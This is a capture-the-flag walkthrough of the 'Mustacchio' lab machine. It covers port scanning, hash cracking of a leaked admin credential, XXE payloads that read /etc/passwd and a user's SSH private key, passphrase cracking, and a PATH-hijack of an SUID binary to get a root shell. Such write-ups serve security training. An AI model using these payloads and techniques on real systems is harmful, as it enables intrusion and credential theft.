# Mustacchio

## Nmap

```
nmap 10.10.81.131 -p- -sS -sV

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http?
8765/tcp open  ultraseek-http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A quick glance at port 80 shows the following root page:

![](<../../../.gitbook/assets/image (1744).png>)

Browsing to port 8765 in a web browser reveals a login page:

![](<../../../.gitbook/assets/image (1745).png>)

I initially tried brute forcing a login and was unsuccessful. I also executed Dirsearch.py again this and did not pull any interesting information.

Back to port 80 I then run Dirsearch.py again it.

```
sudo python3 dirsearch.py -u http://10.10.81.131/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r --full-url -t 50 
```

![](<../../../.gitbook/assets/image (1746).png>)

This leads to the discovery og the `/custom/` directory. Viewing the `/js` directory within `/custom/` we find the file users.bak.

![](<../../../.gitbook/assets/image (1747).png>)

Opening the file in DB Browser we see the following information below:

![DB Browser](<../../../.gitbook/assets/image (1748).png>)

We now have the username and hash of: `admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`. Running the hash against `hash-identifier` shows this is likely either a SHA-1 or MySQL5 hash.

![](<../../../.gitbook/assets/image (1749).png>)

Knowing this I then run the hash against `Hashcat`. Specifying the rockyou.txt wordlist

```
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (1750).png>)

With the password now cracked we have the complete credentials of: `admin:bulldog19`. It is then possible to login on the admin panel on port 8765.

![](<../../../.gitbook/assets/image (1751).png>)

Viewing the source of the page we can see a comment left advising the user Barry can login with his SSH key.

![](<../../../.gitbook/assets/image (1752).png>)

Looking close again at the source code we see a directory path of `/auth/dontforget.bak`.

![](<../../../.gitbook/assets/image (1753) (1).png>)

Viewing the contents of `dontforget.bak`:

![](<../../../.gitbook/assets/image (1754).png>)

Pasting this into the comment field on /home.php and submitted we can see the content being viewed.

![](<../../../.gitbook/assets/image (1755).png>)

We can take this and attempt to use the same format to perform XXE and retrieve a file from the target system.

Essentially below we are taking the skeleton of the XML request in `dontforget.bak`. Ensuring the Name and author fields are still populated. The line '`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`' defines the file to read and binds it to the variable 'xxe'.

Then back at the XML shown below we are going to print the contents of the file defined in the 'xxe' variable into the comment field so it is viewable.

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

Where when the code above is run on /home.php we are able to view /etc/passwd.

![](<../../../.gitbook/assets/image (1756).png>)

Now that we know that the user Barry has a SSH key we can attempt to read it from the common SSH location.

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

![](<../../../.gitbook/assets/image (1757) (1).png>)

After saving the key locally and setting the correct permissions with `chmod` we are prompted for a passphrase.

![](<../../../.gitbook/assets/image (1758).png>)

`ssh2john.py` can then be invoked to create a hash of the key ready for cracking.

```markup
/usr/share/john/ssh2john.py barry_rsa >> barry_hash.txt
```

Which can then be easily cracked using John.

```markup
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/barry_hash.txt 
```

![](<../../../.gitbook/assets/image (1759).png>)

We are then able to login as barry.

![](<../../../.gitbook/assets/image (1760).png>)

I then used `SCP` to transfer over linpeas.sh to the target machine.

```markup
scp -i <id_rsa> <FileToUpload> barry@<IP>:/<Path>
```

After running linpeas.sh it soon finds a custom SUID binary for `/home/joe/live_log`.

![](<../../../.gitbook/assets/image (1761).png>)

Running the binary it looks like its grabbing the results from `/var/log/nginx/access.log` as shown by linpeas.sh

![](<../../../.gitbook/assets/image (1762).png>)

We can see from running the strings command against the binary that at one point the binary will call the 'tails' binary. As we can see from below this has not been given an absolute path and is subject to being hijacked.

![](<../../../.gitbook/assets/image (1763).png>)

From here I then created a file called 'tail' in the home directory for barry with the following contents:

```markup
#!/bin/bash
/bin/sh
```

Then set the file to be executable.

```markup
chmod +x tail
```

Then exported a new path that calls into our home directory before looking anywhere else so we can run our tail binary before the intended one is executed.

```markup
PATH=/home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Then when executing the SUID live\_log binary this should call the tail binary in barry's home folder and spawn a root shell.

![](<../../../.gitbook/assets/image (1764).png>)
